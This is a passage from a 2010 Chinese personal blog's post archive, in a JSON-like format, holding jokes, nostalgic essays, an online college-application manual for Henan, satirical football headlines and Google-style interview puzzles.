渴望感情回报的巨蟹座，却遇上不知感激的人 ­ 热爱自由、旅行的射手座，被留校、留职察看 ­ 眼看摩羯座的目标就快要达成了，却偏偏出现阻碍 ­ 怕被朋友误解的天秤座，有一天真的被朋友误解了 ­ 擅长发挥想像力的双鱼座，被要求背些死记的东西 ­ 心爱的人居然敢对天蝎座隐瞒，这下得吃点苦头了 ­ ­ 【情话绵绵】 ­ 摩羯座说爱你，是我一生无悔的选择 ­ 双子座说爱你到明年情人节也不想停 ­ 双鱼座说你就是我最美、最浪漫的邂逅 ­ 狮子座说没有人能代替你在我心中的地位 ­ 射手座说你是我今生唯一的、最终的情人 ­ 天秤座说你是我一生的依恋，爱你直到永远 ­ 处女座说你明白我的心，我热切渴盼你的爱 ­ 天蝎座说你是我最致命的吸引力，爱你爱上瘾了 ­ 金牛座说没有你，我的世界将无法运转，濒临末日了 ­ 牡羊座说「我爱你」三个字不够，应该是「我超爱你」四个字才对 ­ 巨蟹座说星期一到星期六，想你、爱你，星期日，我用快递把我送给你 ­ 水瓶座说你对我「用力」放电的那一刻开始，我就意乱情迷，神魂颠­","link":"/2010/079_2010-07-0914_09/"},{"title":"如果你停机了，谁会为你充值","text":"如果，有一天你停机了，谁会为你充值呢？ 或许，这辈子，我们永远不会遇到这样的人。 但请记住：那些在你停机后为你充值的人，才是真正关心你的人，真正要找 你的人！ 我们，慢慢学会用手机代替一切，一些无线信号会传递很多东西。 我们习惯的去干很多东西，你习惯电话发出后，是一串应答，而不是冷冰冰的“您所拨打 的电话以停机”，有些人无法理解很多东西，但是有种感觉叫做失望。 有种恐惧叫做害怕，我们永远无法理解貌似失去的感觉，一种习惯，也是一种感觉，更是一种 生活，一些人的生活。 我的朋友们，在你的心里曾经想为谁充值，又希望谁为你充值呢？ 我们心里总有那个人的，是谁呢！ 我的轮回里，有你的影子，慌慌乎乎、 有 些朦胧，也注定会失去，就像那一声“对不起，您所拨打的电话已停机”敲碎了所有的感觉，落了一地的伤心，成为碎片，再也拼不出完整的你，再也拼不出…","link":"/2010/082_2010-07-0800_44/"},{"title":"90后的这些痛楚,谁能理解?","text":"别人都说90后孩子很幸福，好吃好住，不用去担心吃苦，不会去担心明天会不会有饭吃。 许多家长都盲目的“望子成龙，望女成凤。”但是，他们并不知道，这⑧个字后面，我们的努力和艰辛。 为了自己孩子的未来就剥夺孩子的童年。但是谁又能预言以后的事呢？ 90后啊，90后。 别人都说我们应该理解父母，但是为什么没有人来理解我们？； 都说我们应该听从父母的话，但是为什么没有人来听听我们的想法？； 都说我们应该努力学习，但是为什么没有人看得到我们的汗水？； 90后的孩子很幸福，其实很累。 90后的孩子虽然很爱笑，其实很悲伤。 90后的孩子虽然很懒惰，其实很心细。 90后的孩子很淘气，其实很善良。 90后的孩子很希望被理解。 明明很想哭，却还在笑。 明明很在乎，却装作无所谓。 明明很想留下，却坚定的说要离开。 明明很痛苦，却偏偏说自己很幸福。 明明忘不掉，却说已经忘了。 明明放不下，却说ta是ta，我是我。 明明舍不得，却说我已经受够了。 明明说的是违心的假话，却说那是自己的真心话。 明明眼泪都快溢出眼眶，却高昂着头。 明明已经无法挽回，却依旧执着。 明明知道说这样的话会伤害ta，却忍着心疼装作轻松的说出口。 明明知道自己很受伤，却说你不必觉得欠我的。 明明这样『伪装』着很累，却还得依旧……","link":"/2010/085_2010-07-0800_34/"},{"title":"魔王公主超纠结对话","text":"魔王 :“你尽管叫破喉咙吧…没有人会来救你的….” 公主 :“破喉咙..破喉咙..” 没有人:“公主..我来救你了…” 魔王 :“说曹操曹操就到…” 曹操 :“魔王..你叫我干嘛..” 魔王 :“哇勒..看到鬼” 鬼 :“靠!被发现了..” 靠 :“阿鬼,你看的到我喔…” 魔王 :“Oh,My God!” 上帝 :“谁叫我?” 谁 :“没有人叫你阿…” 没有人:“我哪有?装蒜啊!” 蒜 :“谁在装我?” 谁 :“又说我?你们找麻烦啊?” 麻烦 :“哪一个找我?” 哪一个:“找你?我才没有…咦,这儿有好多人.” 好多人:“我才刚到耶……你是谁?” 哪一个:“我才不是谁.” 谁 :“他才不是我.” 公主 :“大家都是来救我的吗?” 大家都:“我不是来救你的,是来看热闹的.” 热闹 :“我有什麽好看的?” 上帝 :“不关我的事,先走了.” 魔王 :“你回答一个问题再走,为什麽这麽多人救公主?我这个魔 王怎麽演下去?” 下去 :“你好好的魔王不干,演我做什麽?” 公主 :“魔王若是没有人演,我就可以走了.” 没有人:“若是我演魔王,怎麽会让你走…” 怎麽会:“我才不让公主走,我要看热闹.” 热闹 :“看我干什麽?” 什麽 :“你居然要『干』我?流氓!” 你居然 :“我哪有?” 我 :“关我什麽事ㄚ?” 魔王 :“靠!我要疯了…….” 靠:“喊我干什么!…” 疯了 :“你要我干啥?” 你要我 :“我什麽都不知道ㄚ!” 我什麽都不 :“我哪知啊!” 我哪知 :“我在这里ㄚ!有人在叫我吗?” 有人:“我没有叫你啊!” 我没有:“谁叫他了啊?” 谁:“冤枉啊…我没有…” 我没有:“我可没冤枉你啊…” 你:“谅你也不敢.” 谅你:“谁说我不敢!?” 谁:“拜托啊…我什麽都没说啦” 我什麽都没:“你要我说什麽?” 我什麽都不:“…你…你不就是我那失散多年的兄弟吗?” 我那失散多年的兄弟:“拷…我名字取这麽长…也会被叫到 啊…” 谁:“…我要赶快离开这个是非之地” 是非:“原来这里是我的地盘啊…” 我什麽都不&amp;没:“你们别吵阿拉在讲话啦…” 你们别吵阿拉:“我没有在讲话啊…” 我没有:“我才没有讲话咧!…” 我什麽都不:“-_-\\\\\\“…走…阿拉到外面去聊…” 走:“人家不好意思啦…(扭捏)” 我什麽都没:“关你屁事啊…闪啦…”(两兄弟生气的走出去) 关你屁事:“呜…为什麽赶我走…” 为什麽:“我没有要赶你走啦…乖…不要哭” 我没有:“喔…又关我啥事了” 关我啥事:“啥?有人叫我吗?” 有人:“谁要叫你啊…” 谁:“我真的要走了…T.T” 走:“人家真的不好意思啦…*V.V*”(\\\\\\“谁\\\\\\“不支倒地) 关你屁事:“…你不是我表妹吗?” 关我啥事:“…表哥…好久不见啦…” 好久:“我不是在这里嘛…” 魔王:“你们有完没完?” 完没完:“他才没有我” 你们:“我才没有他” 我才:“谁说的?” 谁:“叫我干吗?” 吗:“你居然要干我?” 你:“我才不会干他” 我才:“谁说我不会?” 谁:“冤枉!我没说……” 说:“叫我干吗?” 吗:“你们俩真不要脸!” 你们俩:“我要!我要!” 脸:“谁要我?” 谁:“我不要啊” 魔王:“快一点,再说我可要撵人啦” 人啦:“赶撵我?找K” K:“谁找我?” 谁:“aaaaaaa!别提我的名字,再提我也K他!” 他:“别K我” 我:“谁要K我?” 谁:“终于让我逮找一个啦,杀呀…………” 一个啦:“别逮我” 我:“我也受够啦,谁再提我的名字,决不放过你!” 谁:“看我的降龙十八掌!” 我:“看我的九阴白骨爪!” 降龙十八掌:“我有什么好看的?” 九阴白骨爪:“我有啥好看的?” 什么好看的:“兄弟,我终于找着你啦!” 啥好看的:“哥,咱出去聊.” 魔王:“妈的…这是认亲大会啊…” 从此以后,魔王真的得了精神分裂症…","link":"/2010/087_2010-07-0522_14/"},{"title":"晒一晒我的昵称发展史","text":"我的QQ号是四年级的时候买的，那时候注册的人太多，轮卟上了都….只好买了一个，10块钱，8位29553407还带个太阳，嘻嘻吖吖…. 号一开始因为是别人盗的（赃物….），个人资料面目全非，只记得那时昵称是“此号已封”。 当时起昵称也没个经验，胡编一个——“地球人”先将就着吧…. 后来嘛，卟知哪里来的灵感，好像是玩游戏的时候，想出来一个昵称“炸弹精灵”。稍微修饰了一下，在中间加了一个“&amp;”号，呵呵，自我感觉良好~ …………之后很长时间（也就一年）没改昵称。 大家都知道咱学校（八中）旁边有个饭店叫“天堂鳥”吧，字体太艺术了…我当时还以为是“天堂馬”…后来明白了，卟过认为“天堂馬”这个名字卟错，带上姓同学也好认，就又改了，叫——『天堂馬』（带引号） 这个名字一直坚持到初中。 之后我改的就比较频繁了，在网上找过一个昵称，挺花哨，叫什么我忘了，只记得带个笑脸一样的符号（卟是“??”，可能无法显示）。没用多久，别人提意见说卟好听，我又换了… 中间换了个什么来着？我忘了，大家若记得告诉我哈~ 再后来为换昵称方便我经常加前缀后缀—— 楼兰蜃影 楼兰蜃影LET @楼兰蜃影LET（很长时间） C:\\楼兰蜃影LET C:\\蜃影LET_（“C:\\_”主题，DOS来的灵感） C:\\吖卟哒咔_（咿yi吖a卟bu3哒da嘧mi呷xia1/ga1咕gu咔ka，branka说是我的咒语….字数限制打卟完，翻字典找的，原创~） C:\\imaegoo_（嘛意思以前日志发表过，翻翻找吧） c:\\imaegoo_（大写C看着很卟协调..改了！） C:\\iMaeGoo_（还是卟协调…改后面） iMaeGoo_（就是现在，干脆C:\\卟要了） 冒泡无罪★发言有理★刷屏卟介意！！！","link":"/2010/090_2010-07-0417_30/"},{"title":"常用的一些日语  笑死了。","text":"你好 （哭你一起挖）我回来啦 （他大姨妈）哥哥 （哦尼桑）可爱 （卡哇咿）怎么？ （哪尼）你好帅 （卡酷咿）原来如此 （哪里糊涂）我吃了 （一打卡玛斯）早上好 （我还要狗炸一玛斯）怎么可能 （玛撒卡）好厉害 （自由咿）谢谢 （啊丽牙多） 怎么啦 （都西大）偷一下懒 （傻不你呦）这可不行 （所里挖那里蚂蚁）为什么？ （男的诶）那是什么 （男的所里挖）什么意思？ （满家所里挖）笨蛋 （八噶）我明白啦 （挖卡打蛙）这是 （库里挖）加油 （刚巴黎）搞定啦！ （亚当！）朋友 （偷猫打鸡）不行 （打妹）说的也是 （受打内） 太好啦！ （有疙瘩！）真的？ （轰！逗你）小姐 （我揪下嘛）不要啊！ （呀灭蝶！）可恶 （扣手）对不起 （狗咪那啥咿）没关系 （一挖呦）不要紧吧？ （带胶布？）约会 （带兜）是的 （嗨）晚安 （哦压死你）到此为止 （哭了妈的） 看喷了我 ， 太搞了。","link":"/2010/092_2010-07-0222_02/"},{"title":"大家都卟知道iMaeGoo是什么意思啊","text":"imaegoo，音标/i’maegu:/，念“噫麦咕”。分3部分——i,Mae,Goo。i是“我”的意思（废话….），Mae源于“马”谐音，Goo是某种外星生物，球体，只有两只大眼睛，据种类卟同体色、特性也卟同，黑色最为常见，有的因类似气球还会飞（额…跑题了），其中一只绿色的粘性Goo口头禅imaegoo，爱隐居……别的我卟太了解～PS：近期将公布偶滴历史昵称及含义…","link":"/2010/094_2010-07-0220_04/"},{"title":"这就是好朋友， 你的身边有几个呢…","text":"1.好朋友就是经常叫你“去死吧”的那些人……­ 2.好朋友就是老是说你有病叫你看医生的那些人……­ 3.好朋友就是抓住你的一个缺点说上半天的那些人……­ 5.好朋友就是在你面前肆无忌惮地说很难听的话的那些人……­ 7.好朋友就是说要拉大队去你学校把你吃穷的那些人……­ 8.好朋友就是看着自己玩的很开心在旁边不参与也会觉得很开心的那些人……­ 9.好朋友就是会教你怎么走路小心，过马路看车的那些人……­ 10.好朋友就是你考完试还晕乎乎的时候在你出现在你面前嘻嘻哈哈，还说你不要怕，吸取经验，明年再考过的那些人……­ 11.好朋友就是跟你一起不分轻重可是对你父母毕恭毕敬的那些人……­ 12.好朋友是平时恶型恶相，却在你遇到难事时语重心长地开导你的那些人……­ 13.好朋友就是那些无论原本是忧郁，沉默或是乐观向上，在一起总是嬉闹声一片的那群人……­ 14.好朋友是你想起嘴角上扬的那些人……­ 15.好朋友是时间和距离都无法从你脑海，心中带走的人……­ 16.好朋友就是听到你说了一句错话笑闹半天还要罗嗦上一段时间的那些人……­ 17。好朋友就是不经常联系，但你还忘不掉的那个人！­ 18。好朋友就是俩个人在一起，你不用担心会说什么错话。做错什么事的那个人！­ 19.好朋友是你会突然想念的那个人！­ 20.好朋友是无论谁占谁一点便宜都不会计较的那个人！­ 21.好朋友就是和你同甘共苦。不会出卖你的那个人！­ 22.好朋友就是什么事都会和你分享的那个人。­ 23.好朋友就是好久没见，在一起时还会和你套心窝子说话，就像昨天刚在一起吃过饭的那个人！­ 24.好朋友就是和他在一起时你是最真实的你的那个人。­ 25.好朋友就是很久没联系，见面也不会尴尬的那个人。­ 26.好朋友就是无论你做了什么傻事。都会给你支持和信任的那个人。­ 27.好朋友就是……无论他做了什么，你也觉得他是你好朋友的人！­ 28.好朋友就是半夜三更会和你一起纠结要不要睡觉的那个人。­ 29.好朋友就是在你面前会变得啰嗦，你会笑着说他像你妈的那个人。­ 30.好朋友就是无聊时喜欢凑在一堆一起做无聊的傻事的那些人。­ 31.好朋友就是会和你在大街上丢脸会拽着你的手狂奔的那个人。­ 32.好朋友就是会跟你在无意间对视之后再跟你一块放声狂笑的那个人。­ 33.好朋友就是你会因为他的一句话而充满勇气与信心的那个人。­ 34.好朋友就是彼此之间喜欢恶作剧并且在恶作剧成功之后两人都笑得很开心！­","link":"/2010/093_2010-07-0222_01/"},{"title":"2010年河南省普通高校招生网上志愿填报模拟演练操作手册","text":"2010年河南省普通高校招生 网上志愿填报 模拟演练操作手册 2010年5月 目 录 一、重要说明… 1 二、填报流程… 1 三、用户登录… 3 四、填报志愿… 5 五、修改志愿… 10 六、浏览志愿… 11 七、提交志愿… 11 八、安全退出… 12 一、 重要说明1、本次网上填报志愿为模拟演练，是为了使考生熟悉本系统，提高广大考生计算机操作能力，避免真实填报志愿时发生不必要的错误。这次志愿填报不具有真实效力，不作为高招录取的依据。 2、考生在填报志愿前请认真阅读河南省招生办公室发布的新闻和政策公告，有些志愿必须符合相关招生政策要求的考生才能报考，比如有些志愿有性别、年龄、民族以及自主招生资格限制，如果考生不符合某些条件而填报了，系统会给出红色错误提示信息。 3、考生一定要保存好自己的考生号和密码，以免因考生号和密码丢失或泄漏造成不必要的麻烦。万一忘记密码，可以通过网报系统首页的“忘记密码”选项输入考生号、身份证号、姓名和密码验证信息，重置自己的密码。如忘记密码提示问题，请考生本人持准考证和身份证到就近市县区招办重置密码。 4、考生应提早上网填报志愿，不要在临近截止时间集中填报或修改志愿，避免因网络访问量增大，造成网络不畅、网速缓慢等，从而影响填报。如果是遇上意外停电等因素，更是得不偿失，所以务必要及早填报。 二、 填报流程考生在填报志愿前一定要认真阅读河南省招生办公室网站和专业目录上发布的新闻公告和招生政策。然后认真阅读招生计划信息，把自己选择的志愿信息按志愿草表填写，这样能够有足够的考虑时间，避免在志愿填报时候盲目查询专业目录，填错志愿信息。 做好上面说到两点后，登录河南省招生办公室网站的河南省普通高校招生考生服务平台填报志愿。考生使用自己的考生和密码登录后，选择相应批次的志愿，正确无误的填写志愿。确认无误后，保存志愿。 志愿保存后考生一定要慎重考虑是否提交志愿，因为提交后，志愿便不能修改。但志愿一定要在规定的截止日期前提交，只保存而不提交志愿，志愿信息无效。所以考生保存志愿后，确认志愿信息无误后，应及时提交志愿。 下图为网上志愿填报的流程： 图1网上志愿填报流程 三、 用户登录1、登录河南省招生办公室网站（www.heao.gov.cn），选择网上服务大厅栏的“网上志愿填报”链接，进入系统。或者直接访问河南省普通高校招生考生服务平台（pzwb.heao.gov.cn）。 图2 河南省招生办公室首页-网上志愿填报链接 2、进入考生服务平台后，请仔细阅读“信息发布”区、“注意事项”区发布的政策公告和注意事项。 3、在考生登录区域输入考生的考生号、密码和验证码，点击登录，登录普通高招服务平台。 图3 考生登录区域 4、如果考生忘记自己的考生号和密码可以通过菜单栏的“忘记考生号”和“忘记密码”菜单项找回自己的考生号和重置自己的密码。如下图： 图4 找回考生号和密码重置页面 四、 填报志愿志愿填报根据操作形式主要分为两大类，普通类和对口生、专升本类。对于普通类考生，考生需要先查询专业目录，填写志愿草表，然后上网登录手工输入院校代号和专业代号。 专升本和对口生可以手动输入院校代号和专业代号，同时也可以点击院校和专业输入框后面的“选择院校”和“选择专业”按钮，使用计划查询功能。该功能具有智能筛选功能，自动显示符合相应条件的计划信息，如果信息比较多，请使用翻页功能或者输入页码直接跳转到相应的页。普通类考生征集志愿时也将采****取这样的形式填报。 对于一个志愿，不允许在没有输入或选择院校的情况下，而输入或选择了专业和专业调剂。对于一个志愿，专业可以不全部填写，但是必须顺序填报，例如系统不允许专业1没有填写的情况下填写后续专业。对于多个志愿之间，例如几个平行志愿间，可以不全部填写，但是系统要求顺序填报。不能保存没有填写任何志愿信息的志愿。 考生一定要注意系统给出的红色信息提示，检查自己填报的志愿是否符合招生政策和输入数据是否合法（院校代号为4位，专业代号2位，以及输入的院校代号是否存在），及时改正错误的志愿信息，否则志愿信息无法保存。 专业调剂在默认状态下是没有做任何选择的，考生如果填写了院校和专业信息，必须选择同意或者不同专业调剂。如果考生清空了一条志愿的院校和专业信息，则系统会自动清空志愿调剂的选择状态，否则保存时系统提示志愿信息不正确，考生将无法保存志愿数据。 A.普通类考生志愿填报： 1、登录普通高招服务平台后，点击菜单栏的“填报志愿”菜单项，下拉菜单显示出当前可以填报的各个批次的志愿。或者通过工作进度栏的“点击填报”直接进入填报页面。 图5 河南省普通高校招生服务平台 2、点击相应批次的菜单，进去志愿填报页面。如下图：选择本科一、二批志愿填报。 图6 填报志愿菜单 3、进入相应批次的填报界面。 图7 本科一批志愿填报图（部分） 4、志愿填报计时，进去志愿填报页面后，填报区域右侧有一个倒计时提醒，志愿填报必须在30分钟内完成。如果考生30分钟后还没有保存志愿信息，系统会提示考生是否保存志愿信息。倒计时提醒如下图所示： 图8 倒计时提醒 5、根据招生计划信息，输入院校代号和专业代号，院校和专业信息填写完整后选择是否同意专业调剂。 6、保存和重新填写志愿。考生如果确认自己填报的志愿信息无误后，点击志愿填报页面最下方的点击“保存志愿”按钮保存志愿信息。点击“保存志愿”后，系统会给出确认框。确认无误，点击“是”保存志愿，放弃保存点击“否”。注意：未提交的志愿保存一个小时后方可修改。 图9 确认对话框 如果信息有误，想全部重新填写志愿，可以点击页面最下方“重新填写”按钮，清空已填写的志愿信息。 7、志愿保存成功后，系统自动跳转到志愿信息浏览页面，显示考生已经填报的志愿信息，考生可以点击打印按钮打印志愿信息。 图10 志愿浏览界面 B、对口生和专升本类考生志愿填报： 这里主要列出与普通类考生填报志愿不同的地方，进入志愿填报页面后，考生可以根据专业目录手动输入院校代号，也可以点击院校代号输入框后面的“选择院校”，选择相应的学校。 计划查询具有智能筛选功能，自动显示符合相应条件的计划信息，如果信息比较多，请使用翻页功能或者输入页码直接跳转到相应的页。专升本志愿的界面如下： 图11 专升本志愿填报页面 计划查询界面如下： 图12 专升本计划查询页面 对于对口生，与专升本不同的地方时，除了选择院校外还需要选择专业和是否同意专业调剂，计划查询功能的使用方法是一样的。点击院校展开专业信息，然后双击专业即可选择相应的志愿信息。对口生的志愿的界面如下： 图13 对口生志愿填报页面 五、 修改志愿1、考生保存志愿一小时后才可再次修改志愿信息。 2、点击“填报志愿”，选择相应批次的志愿，如果考生已经保存过志愿，则显示上次保存过的志愿信息。 3、修改志愿信息，确认无误后保存。 六、 浏览志愿1、如果考生已经保存或者提交志愿数据，考生可以登录普通高招考生服务平台浏览填报的志愿信息，。 2、点击菜单栏的“浏览志愿”既可查看已填报的志愿信息。 七、 提交志愿保存志愿后，系统特意留了两分钟的时间供考生再次检查志愿填报是否正确。提交按钮会显示两分钟的倒计时，两分钟后提交按钮激活考生才可以提交志愿。 注意：由于志愿一旦提交便无法修改。因此，提醒广大考生，提交志愿前请慎重考虑，确保无误后在规定的填报截止日前尽早提交志愿信息。 八、 安全退出1、使用过程中，同一台电脑同时只允许一名考生进行操作。 2、考生保存或者提交志愿后，点击“退出”，安全退出系统，然后关闭浏览器，避免造成信息泄露。","link":"/2010/098_2010-06-1221_44/"},{"title":"吃麦当劳要发票是谣言","text":"……吃麦当劳、肯德基索要发票是爱国，去家乐福、沃尔玛索要发票他们就不能偷税了————餐饮业纳的是营业税，而麦肯那种快餐业都是专用的税控机器。人家纳不纳税，纳多少，跟你要的那个发票是没任何联系的。要发票的唯一用处就是可以刮奖！","link":"/2010/09_20100614103604/"},{"title":"笑得流泪的大学生毕业语录","text":"1. 什么是母校，就是那个你一天骂他八遍却不许别人骂的地方。 2. 大学就像校门口的公交车，坐上车，去了又回，那是又开始一个学期；坐上车，去了不回，就毕业了。 3. 我用一麻袋的钱上大学，换了一麻袋书。毕业了，用这些书换钱，却买不起一个麻袋。 4. 大学从我身上爬起，穿上裤子对我说“留下青春，你走吧。” 5. 抱着一张大学录取通知书来睡觉，醒来后发现通知书变成了毕业证，证明我曾经在这里睡过。 6. 用四年的时间换一个心底永远的回忆。 7. 叶子的离开是风的多情还是树的不挽留，你我的离校是人生的催促还是青春的不停留。 8. 人之将毕业，其言也善。 9. 今天天气不错，明天没有课……以后都没有了…… 10.我哭着到来，大家都笑了；我微笑着离开，大家都哭了。哎，这就是大学…… 11.看着空荡荡的宿舍和柜子，总觉得留下了什么，原来我留下了我对你们的思念。 12.毕业了，才发现大学生是最好的职业。 13.母校是什么，你刚来的时候巴不得早点走，可真当你要走的时候，又急切的希望能多留一两天。 14.再也不用逃课了，因为没有课上了…… 15.几个人用同样的要是打开同一扇门；几个人用同样的目光，跟空荡的寝室说再见。 16.大学几年，长了见识，也长了头发。 17.曾经抱怨，曾经感慨，如今只剩满腔留恋。 18.就这样眨眼间毕业了。如果上天再给我一次机会，我要永远不毕业…… 19.不说再见，我们后会有期。 附 大学修炼级别对照： 凡人，什么 明天要考高数； 得道，什么 下节课要考高数； 入仙，什么 高才考的是高数； 成佛，什么，昨天有考试； 高级佛爷，高数，高才考的不是英语。 PS：大学里有课树叫高数，很多人都挂在上面。","link":"/2010/101_2010-06-0822_33/"},{"title":"2010高考作文题目汇总","text":"【2010作文汇总】全国1:有鱼吃还捉老鼠全国2:根据材料作文北京:仰望星空与脚踏实地上海:材料作文天津:我生活的世界重庆:命题作文:难题山东:根据材料作文江苏:以”绿色生活”为话题浙江:命题:角色转换之间湖北:材料作文四川:根据主题自拟题目陕西:根据阅读材料写作文湖南:以”早”为题福建:材料作文安徽:由诗歌引发思考或联想辽宁:材料作文江西:找回童年海南:根据阅读材料写作文宁夏:根据阅读材料写作文广东:命题作文:与你为邻","link":"/2010/103_2010-06-0720_08/"},{"title":"国足1:0法国后各大报纸头条","text":"费加罗报：中国邓一脚惊天，洛里斯坦言：当时太可怕了 体坛周报：中国二队一比零小胜法国，世界杯盛宴无中国已沦为鸡肋！ 新京报：天上人间请求重新开业，欲专职服务国足将士将功补过 法制日报：南勇狱中如坐针毡，当初刻意雪藏金童恐罪加一等 南方都市报：富士康险酿新跳——事主闻国足喜讯放弃短见 体育画报：赛后亨利直言输一球已是狡幸，纵是98年的法国也无力回天 朝中社：中国长城摧毁世界冠军信心，朝鲜要求退赛将名额让给中国 黄健翔：邓卓翔落叶堪比天外来客，增城神奇扑救如布冯附体 米兰体育报：用人凸显少帅价值，国米悔草签贝尼斯特 亨利表示将不日空降鲁能：能做邓的队友愿拿老将合同 米兰体育：一用人凸显少帅价值，莫拉蒂只等高洪波签字 罗马体育：一特质令布冯堪比曾诚 里皮：有他在世界杯无解！ 星期日电讯：潜力远超C罗梅西，邓卓翔成炙手可热新金童 FIFA官网：赛后各国纷纷要求FIFA将中国队列为种子球队，32强优胜者与中国进行决赛。 马拉多纳：神杯归属已无悬念，既生马，何生高 泰晤士邮报：炒掉贝帅所为何人，英媒爆红军已密签高洪波 圣保罗shibao:五星巴西望尘莫及，折翼南非另有隐情 慕尼黑每日电讯：里贝里神奇不在 中国邓得齐祖真传 布拉特：如此实力无缘南非？亚洲区预选赛多名裁判将接受调查 弗洛伦蒂诺透露：新一代银河战舰将以中国帮为核心 ESPN:魔力鸟或将下课 皇马一夜之间换帅为了谁？ 韩媒：经专家多方验证，邓为韩国人 巴萨主席：邓卓翔是我们夏季第一目标 ，已经没有多余的钱引进小法 FAFA:新齐祖闪耀留尼旺，梅西足球先生恐将不保","link":"/2010/102_2010-06-0822_22/"},{"title":"超级客服的超级经典语录","text":"语录一： 某客服：请问您的公司名称是什么啊？某客户王先生：天津马自达公司….专营马自达6一段交流之后 通话即将结束~~某客服：不客气，那马先生再见……(俗话说卖啥吆喝啥 我们这里规矩是:卖啥您就得姓啥) 语录二： 电话接通,系统语音提示：2263(工号)为您服务座席接通。客户顿了一下，然后…喃喃自语：啊，不是新浪啊，是263阿，对不起打错了。。。。。嘟嘟~~挂机了。2263号客服郁闷非常……(俺没有结巴 就是两个2 ) 语录三： 某一次，邮箱故障，某一个客户暴怒在%￥＃××※……了半天之后，气愤至极：“去，把你们这最高的人(原意是官职高)给我找来！！！！”某客服：＃＃◎%……￥(看来客服的个子不能太高 容易遭到投诉) 语录四: 客户很愤怒:我要投诉客服:先生您别着急您能告诉我您投诉什么吗?客户:你们的黄页一点都不黄!客服:^@&amp;*)$#~~(黄页是企业名录 看来扫黄打黑要从娃娃抓起了) 语录五： 客服：我把传真号码告诉您，麻烦您记录一下客户(听声音是一位年纪很大的客户了)：你等等我拿笔记下来，好了，你说吧，预备齐。。。。客服：#￥#￥#%……(全民健身很有必要 动笔也是力气活 还要有节奏滴) 语录六: 一个老客户打来电话询问一些产品事宜~客户:~~~~~~客服:哦王先生呀请问王先生您贵姓呀?客服:$#@!%^�(%(确认用户信息准确性是我们的基本要求 问两次姓啥也可以理解哈~) 语录七： 某客户：你们邮箱多少钱一米啊？客服：(我们邮箱的标价是15元/兆 一直在心里想着米和M的换算公式) 语录八: 电话铃声响起 客服接起电话~~客服:欢迎光临＃＃◎%……￥(服务随时随地 不分场合地点 不过这个要是放在饭馆应该比较合适~~)","link":"/2010/105_2010-06-0615_07/"},{"title":"老陈课堂乱扯记录","text":"暂且不说陈老师从沈从文扯到成吉思汗，下面展示一下陈老师的乱扯记录： ** 乞丐的吆喝——百家讲坛——自己的学生如何考上北大——秦始皇——刘邦——刘备——刘邦——项羽——文景之治——门阀制度——士族——庶族——李世民——曹操——科举制——外国人眼中中国的科举制——英国王室的通婚——明朝——锦衣卫——宦官——········································································································——科举制——总结——乞丐的吆喝——初三如何复习——目标定位······································································**","link":"/2010/106_2010-06-0614_53/"},{"title":"全民祈福，为玉树尽一份绵薄之力！","text":"青海省玉树县2010年4月14日晨发生两次地震，最高震级7.1级，地震震中位于县城附近。截至4月19日晚20时，玉树地震遇难人员已达到2039人，失踪195人，受伤12135人，其中重伤1434人。 当困难来临的时候，请你举起你的左手，左手代表着方向，它不会向困难低头；当遇到挫折的时候，请你举起你的右手，右手代表着希望，它不会为挫折发愁。尽管灾难是可怕的，但希望还在，援助也在，地震震不垮我们前进的方向。燃起白色的心烛，让我们共同为玉树祈福。","link":"/2010/109_2010-04-2110_40/"},{"title":"谷歌面试中，15个让人疯狂的经典问题，你能回答几个？","text":"对一些身处经济衰退大潮中的初级经理和软件开发者而言，谷歌是一个避风港。但其招聘门槛较高，首先，谷歌更青睐长春藤联盟(由美国八所知名大学所组成)的毕业生；其次，即使应聘者已年过30，谷歌也很在意其GPA(平均成绩点数)分数；第三，谷歌需要的是那些想改变世界的人。 而且，即使应聘者满足了上述要求，也有可能在面试中被谷歌提出的问题所难倒。以下是15个让许多应聘者抓狂的谷歌面试题。 问题1：一辆校车能装下多少个高尔夫球？应聘职位：产品经理 问题2：如果让你清洗西雅图市所有的窗户，你会对此索价多少？应聘职位：产品经理 问题3：在一个重男轻女的国家里，每家每户都想生男孩。若一户人家生了一个女孩，便会再生一个，直到生下的是男孩为止。请问这个国家的男女比例是多少？应聘职位：产品经理 问题4：全世界共有多少位钢琴调音师？应聘职位：产品经理 问题5：下水道井盖为什么是圆的？应聘职位：软件工程师 问题6：为旧金山市设计一个紧急疏散方案。应聘职位：产品经理 问题7：时钟的指针一天内总共会重合多少次？应聘职位：产品经理 问题8：阐释“死牛肉”的意义所在。应聘职位：软件工程师 问题9：一个人开车来到旅馆，变得一无所有。究竟发生了什么事情？应聘职位：软件工程师 问题10：你想知道好友鲍勃是否有你正确的电话号码，但又不能直接问他。你必须在卡片上留言，让伊芙将卡片较交给鲍勃。除了问题以外，你还应该在卡片上写什么，才能既确保鲍勃能看懂留言，又使伊芙看不出卡片上写有你的电话号码。应聘职位：软件工程师 问题11：你是一艘海盗船的船长，你的船员要投票决定如何平分金条。如果与你意见一致的船员数量少于一半，你将被杀死。你应该如何提议分配金条，才能既分得较多赃物，又能活下来？应聘职位：工程经理 问题12：你有8个大小一样的球，其中7个重量相同，只有一个略重一些。给你一个天平，而且只准称两次，如何找出重量不同的那个球？应聘职位：产品经理 问题13：你在一幢100层高的大楼中，给了你两个鸡蛋。鸡蛋有时非常易碎，有时又异常坚韧。这意味着，如果在第1层扔下鸡蛋，鸡蛋或许会碎裂，而如果是从第100层扔下鸡蛋，鸡蛋或许安然无恙。这两只鸡蛋一模一样。你需要计算出，最高从哪层楼扔下时，鸡蛋不会碎。问题是，你需要扔多少次鸡蛋才能算出该楼层。整个过程中，你只允许打碎两个鸡蛋。应聘职位：产品经理 问题14：向你8岁的侄子或外甥解释什么是数据库，只能用三个句子。应聘职位：产品经理 问题15：你缩小到只有一枚五分硬币那么高，你的质量也成比例缩小以保持原有密度不变。随后你被扔到一个空的玻璃搅拌器里，搅拌刀片将在60秒后开始运转，你该怎么办？应聘职位：产品经理当然 考题不一定要是Google原创的啊，在这里我们就不质疑他的可信度了，我们只是拿来练练脑子 思考一下嘛，你会哪题呢？ **问题的候选答案 **近年来，越来越多的硅谷科技公司开始在面试中提出类似的问题。这些公司感兴趣的并不是正确答案，而是应聘者解决问题的方式和能力。大多面试题目属于主观题,没绝对答案,出题人只想看你的思路.这里我提供一些作参考,只看答案没有用，关键是分析。答案是 从网络上搜索而来。 1.一辆学校班车里面能装多少个高尔夫球？答：推理 大约50万，假设巴士有50个高尔夫球高，50个高尔夫球宽，200个高尔夫球长。 2..要是让你清洗整个西雅图的所有窗子，你会收取多少费用？答：推理过程 